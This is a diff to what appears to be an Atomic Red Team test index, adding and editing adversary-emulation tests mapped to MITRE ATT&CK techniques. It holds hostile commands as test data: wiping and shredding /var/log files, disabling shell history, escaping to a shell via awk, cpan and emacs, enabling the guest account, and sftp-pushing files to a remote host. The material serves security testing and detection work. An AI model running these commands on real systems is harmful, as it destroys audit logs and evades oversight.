@@ -2762,8 +2762,8 @@ defense-evasion:
     - name: Truncate system log files via truncate utility
       auto_generated_guid: 6290f8a8-8ee9-4661-b9cf-390031bf6973
       description: 'This test truncates the system log files using the truncate utility
-        with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying
-        the file content
+        with (-s 0) parameter which sets file size to zero, thus emptying the file
+        content
 
         '
       supported_platforms:
@@ -2785,8 +2785,9 @@ defense-evasion:
 
           '
       executor:
-        command: "sudo truncate -s 0 #{system_log_path} #size parameter shorthand\nsudo
-          truncate --size=0 #{system_log_path} #size parameter \n"
+        command: 'sudo truncate -s 0 #{system_log_path} #size parameter shorthand
+
+          '
         name: sh
         elevation_required: true
     - name: Delete log files via cat utility by appending /dev/null or /dev/zero
@@ -2856,9 +2857,9 @@ defense-evasion:
           '
       executor:
         command: |
-          sudo find /var/log -name '#{system_log_name1}.*' -exec rm {} \; #using "rm" execution
-          sudo find /var/log/ -name "#{system_log_name2}.*" -exec shred -u -z -n 3 {} \; #using "shred" execution
-          sudo find /var/log/ -name "#{system_log_name3}.*" -exec unlink {} \; #using "unlink" execution
+          sudo find /var/log -name '#{system_log_name1}*' -exec rm {} \; #using "rm" execution
+          sudo find /var/log -name "#{system_log_name2}*" -exec shred -u -z -n 3 {} \; #using "shred" execution
+          sudo find /var/log -name "#{system_log_name3}*" -exec unlink {} \; #using "unlink" execution
         name: sh
         elevation_required: true
     - name: Overwrite macOS system log via echo utility
@@ -4084,7 +4085,7 @@ defense-evasion:
           sed -i 's/set +o history//g' ~/.bashrc
           . ~/.bashrc
           set -o history
-        name: sh
+        name: bash
     - name: Use Space Before Command to Avoid Logging to History
       auto_generated_guid: 53b03a54-4529-4992-852d-a00b4b7215a6
       description: 'Using a space before a command causes the command to not be logged
@@ -7132,7 +7133,7 @@ defense-evasion:
       executor:
         command: sudo sysadminctl -guestAccount on
         cleanup_command: sudo sysadminctl -guestAccount off
-        name: command_prompt
+        name: sh
         elevation_required: true
   T1574.006:
     technique:
@@ -13373,6 +13374,7 @@ defense-evasion:
       supported_platforms:
       - linux
       - macos
+      - iaas:aws
       input_arguments:
         stratus_path:
           description: Path of stratus binary
@@ -20403,7 +20405,7 @@ privilege-escalation:
       executor:
         command: sudo sysadminctl -guestAccount on
         cleanup_command: sudo sysadminctl -guestAccount off
-        name: command_prompt
+        name: sh
         elevation_required: true
   T1547.003:
     technique:
@@ -29352,10 +29354,14 @@ execution:
           description: Script path
           type: path
           default: "/tmp/art.sh"
+        host:
+          description: Host to ping
+          type: string
+          default: 8.8.8.8
       executor:
         command: |
           sh -c "echo 'echo Hello from the Atomic Red Team' > #{script_path}"
-          sh -c "echo 'ping -c 4 8.8.8.8' >> #{script_path}"
+          sh -c "echo 'ping -c 4 #{host}' >> #{script_path}"
           chmod +x #{script_path}
           sh #{script_path}
         cleanup_command: 'rm #{script_path}
@@ -29379,6 +29385,55 @@ execution:
 
           '
         name: sh
+    - name: Shell Creation using awk command
+      auto_generated_guid: ee72b37d-b8f5-46a5-a9e7-0ff50035ffd5
+      description: |-
+        In awk the begin rule runs the first record without reading or interpreting it. This way a shell can be created and used to break out from restricted environments with the awk command.
+        Reference - https://gtfobins.github.io/gtfobins/awk/#shell
+      supported_platforms:
+      - linux
+      - macos
+      executor:
+        command: awk 'BEGIN {system("/bin/sh &")}'
+        name: sh
+    - name: Creating shell using cpan command
+      auto_generated_guid: bcd4c2bc-490b-4f91-bd31-3709fe75bbdf
+      description: |-
+        cpan lets you execute perl commands with the ! command. It can be used to break out from restricted environments by spawning an interactive system shell.
+        Reference - https://gtfobins.github.io/gtfobins/cpan/
+      supported_platforms:
+      - linux
+      - macos
+      executor:
+        command: echo '! exec "/bin/sh &"' | PERL_MM_USE_DEFAULT=1  cpan
+        name: sh
+        elevation_required: false
+    - name: emacs spawning an interactive system shell
+      auto_generated_guid: e0742e38-6efe-4dd4-ba5c-2078095b6156
+      description: "emacs can be used to break out from restricted environments by
+        spawning an interactive system shell. Ref: https://gtfobins.github.io/gtfobins/emacs/
+        \ \n"
+      supported_platforms:
+      - linux
+      - macos
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Check if emacs is installed on the machine.
+
+          '
+        prereq_command: 'if [ -x "$(command -v emacs)" ]; then echo "emacs is installed";
+          else echo "emacs is NOT installed"; exit 1; fi
+
+          '
+        get_prereq_command: 'which apt && apt update && apt install -y emacs || which
+          pkg && pkg update && pkg install -y emacs || which brew && brew update &&
+          brew install --quiet emacs
+
+          '
+      executor:
+        command: sudo emacs -Q -nw --eval '(term "/bin/sh &")'
+        name: sh
+        elevation_required: true
   T1559:
     technique:
       x_mitre_platforms:
@@ -33856,7 +33911,7 @@ persistence:
       executor:
         command: sudo sysadminctl -guestAccount on
         cleanup_command: sudo sysadminctl -guestAccount off
-        name: command_prompt
+        name: sh
         elevation_required: true
   T1547.003:
     technique:
@@ -43016,7 +43071,7 @@ command-and-control:
         command: 'sftp #{username}@#{remote_host}:#{remote_path} <<< $''put #{local_file}''
 
           '
-        name: sh
+        name: bash
     - name: sftp remote file copy (pull)
       auto_generated_guid: '0139dba1-f391-405e-a4f5-f3989f2c88ef'
       description: 'Utilize sftp to perform a remote file copy (pull)
@@ -43632,8 +43687,8 @@ collection:
           (which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip)
           echo Please set input_files argument to include files that exist
       executor:
-        name: sh
-        elevation_required: false
+        name: bash
+        elevation_required: true
         command: 'zip #{output_file} #{input_files}
 
           '
@@ -53955,7 +54010,7 @@ discovery:
         external_id: T1016.001
         url: https://attack.mitre.org/techniques/T1016/001
       modified: '2022-04-25T14:00:00.188Z'
-      name: Internet Connection Discovery
+      name: 'System Network Configuration Discovery: Internet Connection Discovery'
       description: |-
         Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites.
 
@@ -53977,7 +54032,28 @@ discovery:
       - User
       spec_version: '2.1'
       x_mitre_attack_spec_version: 2.1.0
-    atomic_tests: []
+      identifier: T1016.001
+    atomic_tests:
+    - name: Check internet connection using ping freebsd, linux or macos
+      auto_generated_guid: be8f4019-d8b6-434c-a814-53123cdcc11e
+      description: 'Check internet connection using ping on Linux, MACOS. The default
+        target of the ping is 8.8.8.8 (Google Public DNS).
+
+        '
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        ping_target:
+          description: target of the ping
+          type: url
+          default: 8.8.8.8
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'ping -n 4 #{ping_target}
+
+          '
   T1069:
     technique:
       modified: '2023-05-09T14:00:00.188Z'
@@ -57031,7 +57107,30 @@ discovery:
       x_mitre_is_subtechnique: false
       spec_version: '2.1'
       x_mitre_attack_spec_version: 2.1.0
-    atomic_tests: []
+      identifier: T1614
+    atomic_tests:
+    - name: Get geolocation info through IP-Lookup services using curl freebsd, linux
+        or macos
+      auto_generated_guid: 552b4db3-8850-412c-abce-ab5cc8a86604
+      description: 'Get geolocation info through IP-Lookup services using curl Windows.
+        The default URL of the IP-Lookup service is https://ipinfo.io/. References:
+        https://securelist.com/transparent-tribe-part-1/98127/ and https://news.sophos.com/en-us/2016/05/03/location-based-ransomware-threat-research/
+
+        '
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        ip_lookup_url:
+          description: URL of the IP-Lookup service
+          type: url
+          default: https://ipinfo.io/
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'curl -k #{ip_lookup_url}
+
+          '
   T1518.001:
     technique:
       modified: '2024-04-16T00:15:53.303Z'
@@ -65999,7 +66098,7 @@ initial-access:
       executor:
         command: sudo sysadminctl -guestAccount on
         cleanup_command: sudo sysadminctl -guestAccount off
-        name: command_prompt
+        name: sh
         elevation_required: true
   T1199:
     technique:
